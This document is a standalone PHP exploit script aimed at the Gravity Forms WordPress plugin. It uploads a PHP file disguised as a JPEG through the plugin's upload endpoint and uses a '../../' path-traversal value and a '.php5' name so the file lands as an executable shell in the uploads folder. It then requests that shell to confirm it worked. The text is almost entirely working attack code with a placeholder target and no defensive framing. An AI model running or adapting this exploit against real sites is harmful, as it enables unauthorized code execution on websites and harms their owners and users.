<?php

$siteURL = 'http://YOURTARGETSITE-dot-com/';
$uploadfile = sys_get_temp_dir() . '/gravityforms.jpg';
if (file_exists($uploadfile)) {
	unlink($uploadfile);
}

file_put_contents($uploadfile, '<?php phpinfo(); ?>');

$shellSuffix = 'gforms_shell_' . time() . '.php5'; // .phtml also works
$shellName = '_input_1_' . $shellSuffix;

$payloadFile = new CURLFile($uploadfile, 'image/jpeg', basename($uploadfile));

$ch = curl_init($siteURL . '?gf_page=upload');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array(
	'file'            => $payloadFile,
	'name'            => $shellSuffix,
	'field_id'        => '1',
	'form_id'         => '',
	'gform_unique_id' => '../../',
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");

echo "[*] Uploading shell to GravityForms.\n";
$result = curl_exec($ch);
$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

curl_close($ch);

//echo $result;
if (strpos($result, '"status" : "ok"') !== false) {
	$shellURL = $siteURL . 'wp-content/uploads/gravity_forms/' . $shellName;
	echo "[+] Upload successful!\n";
	echo "[*] Testing for shell at $shellURL\n";

	$ch = curl_init($shellURL);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");

	$result = curl_exec($ch);
	$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

	curl_close($ch);
	if ($statusCode === 200) {
		echo "[+] Shell created at $shellURL\n";
	} else {
		echo "[-] There was an error creating the shell.\n";
	}
} else {
	echo "[-] Upload failed. Response code was $statusCode.\n";
}



exit;

